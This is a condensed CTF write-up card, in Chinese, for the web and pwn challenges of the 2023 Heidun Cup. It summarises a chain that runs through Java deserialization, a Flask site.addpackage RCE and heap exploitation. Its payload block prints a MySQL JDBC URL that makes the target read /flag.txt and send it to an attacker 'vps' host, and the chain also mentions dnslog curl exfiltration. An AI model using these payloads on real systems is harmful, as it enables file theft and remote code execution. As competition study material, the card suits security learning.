---
title: "2023 黑盾杯 writeup"
category: web
tags: ["黑盾杯", "web", "JdbcRowSetImpl", "c3p0 HexAsciiSerializedMap", "MySQL JDBC本地文件读", "Flask site.addpackage"]
signals: ["黑盾杯 2023", "JdbcRowSetImpl", "c3p0 HexAsciiSerializedMap", "MySQL JDBC本地文件读", "Flask site.addpackage", "dnslog外带", "mysqlbinlog", "IOC匹配", "house of orange", "ssrf", "deserialize", "rce", "sqli", "c3p0"]
difficulty: hard
source: "https://www.ctfiot.com/118253.html"
tools: ["Flask", "Python", "curl", "pwntools"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 黑盾杯 writeup

> 赛事：黑盾杯 2023 | 方向：web | 难度：hard | 工具：Flask、Python、curl、pwntools

## 一句话总结

c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。

## 攻击链

1. 反编译 jar 看 SecurityCheck 黑名单 → JdbcRowSetImpl+c3p0 userOverridesAsString+HexAsciiSerializedMap 触发 MySQL JDBC 读本地文件 → Flask 路由 /upload 目录穿越 + /install 装包 + /add 用 site.addpackage 加 Python 文件 → dnslog curl base64 外带 → mysqlbinlog 恢复 binlog → 正则 + 后 6 位匹配找 IOC → pwntools 连 pwn 远程 → SROP read /bin/sh → offbyone + house of orange 触发 sysmalloc + house of force 改 top chunk 任意地址 → 劫持 __malloc_hook → one_gadget 0x10a2fc

## 关键 payload

```
MyBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#") ; site.addpackage('/tmp/extract', 'exp1.py', None) ; kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h=' 写 0x38 字节后接 SROP 链
```

## 经验教训

限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率的替代链。

## 标签

JdbcRowSetImpl、c3p0 HexAsciiSerializedMap、MySQL JDBC本地文件读、Flask site.addpackage、dnslog外带、mysqlbinlog、IOC匹配、house of orange、house of force、one_gadget、libc-2.27、SROP

## 参考来源

- https://www.ctfiot.com/118253.html
- 原文件：2023黑盾杯-WriteUp.full.md
